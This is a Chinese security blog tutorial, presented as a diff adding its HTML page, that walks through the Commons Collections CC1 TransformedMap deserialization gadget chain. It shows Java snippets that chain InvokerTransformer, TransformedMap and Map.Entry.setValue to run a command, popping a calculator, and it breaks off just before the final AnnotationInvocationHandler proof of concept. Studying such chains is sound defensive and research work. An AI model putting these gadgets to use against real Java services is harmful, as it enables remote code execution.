@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0. 环境搭建​		Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合) 相关类对象。 Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。 包结构介绍  org.apache.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC1-TransformdMap链">
+<meta property="og:url" content="https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/index.html">
+<meta property="og:site_name" content="sh1y1n9aI&#39;s blog">
+<meta property="og:description" content="0. 环境搭建​		Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合) 相关类对象。 Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。 包结构介绍  org.apache.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423231338923.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423231428535.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232621575.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232646963.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232719560.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232734631.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232755015.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232845987.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232914787.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423232931291.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233046785.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233105644.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233157177.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233231183.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233252002.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233401616.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233342192.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233436297.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233456360.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233518500.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233535682.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233716671.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233755182.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233820123.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233840214.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233913063.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423233951193.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234014063.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234047552.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234109771.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234129390.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234149335.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234204471.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234216863.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234236442.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234251043.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234309828.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234329240.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234337820.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234345961.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234417296.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234448329.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234507487.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234529514.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234542793.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234555171.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234630906.png">
+<meta property="og:image" content="https://sh1y1n9ai.github.io/images/image-20240423234659535.png">
+<meta property="article:published_time" content="2023-03-01T15:10:21.000Z">
+<meta property="article:modified_time" content="2024-04-23T15:55:12.365Z">
+<meta property="article:author" content="sh1y1n9aI">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="Commons Collections">
+<meta property="article:tag" content="TransformdMap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sh1y1n9ai.github.io/images/image-20240423231338923.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CC1-TransformdMap链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="sh1y1n9aI&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/03/06/CC1-LazyMap%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/02/05/URLDNS%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&text=CC1-TransformdMap链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&is_video=false&description=CC1-TransformdMap链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC1-TransformdMap链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&title=CC1-TransformdMap链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&name=CC1-TransformdMap链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/01/CC1-TransformdMap%E9%93%BE/&t=CC1-TransformdMap链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">0. 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">1. 前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">2. 实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC"><span class="toc-number">4.</span> <span class="toc-text">3. POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.</span> <span class="toc-text">4. 调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">6.</span> <span class="toc-text">拓展</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CC1-TransformdMap链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">sh1y1n9aI</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-01T15:10:21.000Z" class="dt-published" itemprop="datePublished">2023-03-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/">Java反序列化漏洞专题</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>, <a class="p-category" href="/tags/Commons-Collections/" rel="tag">Commons Collections</a>, <a class="p-category" href="/tags/TransformdMap/" rel="tag">TransformdMap</a>
+    </div>
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="0-环境搭建"><a href="#0-环境搭建" class="headerlink" title="0. 环境搭建"></a>0. 环境搭建</h3><p>​		Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合) 相关类对象。</p>
+<p>Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。</p>
+<p><strong>包结构介绍</strong></p>
+<ul>
+<li>org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类</li>
+<li>org.apache.commons.collections.bag – 实现Bag接口的一组类</li>
+<li>org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类</li>
+<li>org.apache.commons.collections.buffer – 实现Buffer接口的一组类</li>
+<li>org.apache.commons.collections.collection –实现java.util.Collection接口的一组类</li>
+<li>org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类</li>
+<li>org.apache.commons.collections.functors –Commons Collections自定义的一组功能类</li>
+<li>org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类</li>
+<li>org.apache.commons.collections.keyvalue – 实现集合和键&#x2F;值映射相关的一组类</li>
+<li>org.apache.commons.collections.list – 实现java.util.List接口的一组类</li>
+<li>org.apache.commons.collections.map – 实现Map系列接口的一组类</li>
+<li>org.apache.commons.collections.set – 实现Set系列接口的一组类</li>
+</ul>
+<p>Commons Collections的maven仓库：<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p>
+<p>存在漏洞的版本：commons-collections 3.1-3.2.1；JDK 8u71之后已修复不可利⽤</p>
+<p>实验环境： JDK-8u65、commons-collections 3.2.1</p>
+<p>新建Maven项目，选择JDK-8u65</p>
+<p><img src="/../images/image-20240423231338923.png" alt="image-20240423231338923"></p>
+<p>修改pom.xml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423231428535.png" alt="image-20240423231428535"></p>
+<p><img src="/../images/image-20240423232621575.png" alt="image-20240423232621575"></p>
+<p>​		查看CC的依赖包，里面都是class字节码文件；如果想要看源码发现都是反编译过来的（变量名都是v1、v2之类的），无法进行直观的审计（都是class文件，另外使用find usages的时候，IDEA是不会去class文件查找的）</p>
+<p><img src="/../images/image-20240423232646963.png" alt="image-20240423232646963"></p>
+<p>JDK的源码不包含sun包，在JDK的src目录中加入sun源码包，sun目录从源码包：src&#x2F;share&#x2F;classes目录中拷贝到JDK的src目录下即可</p>
+<p><img src="/../images/image-20240423232719560.png" alt="image-20240423232719560"></p>
+<p>配置CC模块的JDK</p>
+<p><img src="/../images/image-20240423232734631.png" alt="image-20240423232734631"></p>
+<p>然后查看源码既可，以上环境就基本搭建好了</p>
+<p><img src="/../images/image-20240423232755015.png" alt="image-20240423232755015"></p>
+<h3 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1. 前置知识"></a>1. 前置知识</h3><p>首先了解Java的命令执行：Runtime.getRuntime().exec(“calc”)</p>
+<ul>
+<li>普通调用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423232845987.png" alt="image-20240423232845987"></p>
+<ul>
+<li><p>反射调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Runtime r = (Runtime) getRuntimeMethod.invoke(c);</span><br><span class="line">Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">execMethod.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423232914787.png" alt="image-20240423232914787"></p>
+</li>
+</ul>
+<p>分析：</p>
+<p>在IDEA中，快捷键两次shift，搜索Runtime；发现getRuntime方法是public修饰的，返回类型是Runtime类型且无参</p>
+<p><img src="/../images/image-20240423232931291.png" alt="image-20240423232931291"></p>
+<p><strong>注：Runtime类是无法进行序列化的，因为没有实现Serializable接口</strong></p>
+<h3 id="2-实战"><a href="#2-实战" class="headerlink" title="2. 实战"></a>2. 实战</h3><p>​		分析commons-collections.jar包中的InvokerTransformer.class类：该类中有个transform方法，如果input对象不为null的话，就会调用下图红框中的代码（可以反射调用input对象中的某个方法）；</p>
+<p>​		那么如果想要命令执行的话，就可以传入Runtime类的exec方法。对比前面反射调用RCE的例子，那么transform方法的input参数就应该为Runtime.getRuntime。</p>
+<p><img src="/../images/image-20240423233046785.png" alt="image-20240423233046785"></p>
+<p>​	继续分析InvokerTransformer.java类的构造方法：有两个构造方法，要想利用transform方法中的反射的话，就需要调用三个参数的构造方法</p>
+<p>​	变量methodName赋值给iMethodName属性，paramTypes数组赋值给iParamTypes属性，args数组赋值给iArgs属性。这三个属性分别对应着要调用的方法名、方法参数类型</p>
+<p>方法的参数。</p>
+<p><img src="/../images/image-20240423233105644.png" alt="image-20240423233105644"></p>
+<p>构造POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 1. 创建InvokerTransformer对象并调用transform方法</span><br><span class="line">new InvokerTransformer().transform();</span><br><span class="line"></span><br><span class="line"># 2. 创建transform方法所需要的参数：Runtime.getRuntime()</span><br><span class="line">Runtime r  = Runtime.getRuntime();    # 因为是静态方法，所以可以直接通过类名调用</span><br><span class="line">new InvokerTransformer().transform(r);</span><br><span class="line"></span><br><span class="line"># 3. 分析构造方法传入相应的参数即可</span><br><span class="line">Runtime r  = Runtime.getRuntime();</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure>
+
+<p>执行弹出计算器；感觉构造方法和transform也太凑巧了，很像是在写一个后门</p>
+<p><img src="/../images/image-20240423233157177.png" alt="image-20240423233157177"></p>
+<p>​		找到恶意利用点，接下来就可以构造链子了。查找哪里调用了transform方法（本质就是找入口，一直找到readObject方法即可），在TransformedMap类中找到checkSetValue方法，该方法调用了InvokerTransformer类的transform方法</p>
+<p>分析：</p>
+<p>​		例如checkSetValue方法中调用了transform方法，而在某个类中的readObject方法中又调用了checkSetValue方法并且该类实现了序列化接口，可以被序列化，那么就可以把该类当成反序列化的入口了。</p>
+<p><img src="/../images/image-20240423233231183.png" alt="image-20240423233231183"></p>
+<p>​		分析checkSetValue方法：直接返回valueTransformer对象的transform方法。跟踪valueTransformer对象，找到定义它的地方；最终在该类（TransformedMap类）的构造方法中找到有valueTransformer的定义</p>
+<p><img src="/../images/image-20240423233252002.png" alt="image-20240423233252002"></p>
+<ul>
+<li>自己的分析方法：</li>
+</ul>
+<p>​		可以尝试通过反射的方法来动态构造TransformedMap类的对象，并把InvokerTransformer作为参数传入。（因为TransformedMap类的checkSetValue方法中的valueTransformer属性可以通过构造方法获得）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Runtime r  = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">Class TransformedMapClass =  TransformedMap.class;</span><br><span class="line">Constructor TransformedMapMethod = TransformedMapClass.getDeclaredConstructor(Map.class,Transformer.class,Transformer.class);</span><br><span class="line">TransformedMapMethod.setAccessible(true);</span><br><span class="line">TransformedMap tmObject = (TransformedMap) TransformedMapMethod.newInstance(map,null,invokerTransformer);</span><br><span class="line"></span><br><span class="line">Method checkSetValueMethod = TransformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(true);</span><br><span class="line">checkSetValueMethod.invoke(tmObject,r);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423233401616.png" alt="image-20240423233401616"></p>
+<ul>
+<li>网上的分析方法：</li>
+</ul>
+<p>​		因为如果想要通过TransformedMap类的构造方法传入InvokerTransformer对象的话，就需要创建TransformedMap对象。这里跟踪发现在前面有个静态方法：decorate；该方法中创建了TransformedMap对象。</p>
+<p><img src="/../images/image-20240423233342192.png" alt="image-20240423233342192"></p>
+<p>因为是静态方法，可以直接通过类名来调用，而不用通过反射。构造POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Runtime r  = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = TransformedMap.decorate(map,null,invokerTransformer);     // TransformedMap类间接实现于Map接口</span><br><span class="line"></span><br><span class="line">Class TransformedMapClass = TransformedMap.class;</span><br><span class="line">Method  checkSetValueMethod = TransformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(true);</span><br><span class="line"></span><br><span class="line">checkSetValueMethod.invoke(decorateMap,r);  // 这里的第一个参数：因为TransformedMap类调用decorate方法会返回当前类的对象，返回类型是Map</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423233436297.png" alt="image-20240423233436297"></p>
+<p>跟踪到decorate方法，继续find useages，发现无法继续深入，没有对该decorate方法继续调用的地方。</p>
+<p><img src="/../images/image-20240423233456360.png" alt="image-20240423233456360"></p>
+<p>所以只能回到chekcSetValue方法中，重新寻找链子；在AbstractInputCheckedMapDecorator类的内部类MapEntry有个setValue方法调用了checkSetValue方法。</p>
+<p><img src="/../images/image-20240423233518500.png" alt="image-20240423233518500"></p>
+<p>继续往下分析：</p>
+<p>​		跟踪到AbstractInputCheckedMapDecorator类，该类中有个内部类MapEntry的setValue方法里有对checkSetValue方法的调用。</p>
+<p><img src="/../images/image-20240423233535682.png" alt="image-20240423233535682"></p>
+<p>对Java熟悉的话，看到setVlaue可能会比较敏感；map接口中有对setValue方法的定义，setValue() <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 </p>
+<p>setValue() 操作。</p>
+<p>那么只需要对map即可进行遍历，就可以调用setValue方法间接调用checkSetValue方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">map.put(&quot;key&quot;, &quot;value&quot;);    // 键值对中要有东西，不然无法调用setValue方法</span><br><span class="line">for (Map.Entry entry:decorateMap.entrySet()) &#123;  </span><br><span class="line">    entry.setValue(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 分析：</span><br><span class="line">    decorate方法返回值是一个Map，该方法实际上类似于一个动态代理案例中的代理类，对Map传进来的key和value做一些处理；</span><br><span class="line">因为decorate方法返回值是Map，那就可以对它进行遍历；entry保存的就是一个个的键值对；</span><br><span class="line">TransformedMap类没有setValue方法，但是TransformedMap类继承于AbstractInputCheckedMapDecorator类，所以可以调用setValue方法</span><br></pre></td></tr></table></figure>
+
+<p>修改payload，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime(); </span><br><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); </span><br><span class="line">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); </span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;); </span><br><span class="line">Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,invokerTransformer); // TransformedMap类间接实现于Map接口 </span><br><span class="line">for (Map.Entry entry:decorateMap.entrySet())&#123; </span><br><span class="line">    entry.setValue(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240423233716671.png" alt="image-20240423233716671"></p>
+<p>执行payload，弹出计算器</p>
+<p><img src="/../images/image-20240423233755182.png" alt="image-20240423233755182"></p>
+<p>攻击思路：</p>
+<p>​		找到一个是Map的入口类，遍历这个集合，并执行 setValue 方法，即可构造 Poc。（如果一开始就能在一些readObject方法中找到可控对象（InvokerTransformer类）的transform方法，那这条链子就会很轻松；但是往往都是通过不断间接的调用，才构成链子）</p>
+<p>​		继续跟踪setValue方法的调用，定位到JDK-8u65版本中的AnnotationInvocationHandler类的setValue方法（前面都是CC组件中的链子），并且该setValue方法是在readObject中的，AnnotationInvocationHandler类还实现了Serializable接口，可以被序列化。</p>
+<p>​		该类中的setValue方法是通过memberValue调用的，参数memberValue又是通过memberValues集合获得的；那么只需要控制memberValues为TransformedMap类decorate方法的返回即可</p>
+<p><img src="/../images/image-20240423233820123.png" alt="image-20240423233820123"></p>
+<p>分析AnnotationInvocationHandler类的构造方法：</p>
+<p>​	刚好memberValues参数通过构造方法传入，且该类和构造方法的作用域都是default，只能本类中调用；就需要通过反射来获取类及构造函数，再实例化它。</p>
+<p><img src="/../images/image-20240423233840214.png" alt="image-20240423233840214"></p>
+<p>通过反射，构造POC</p>
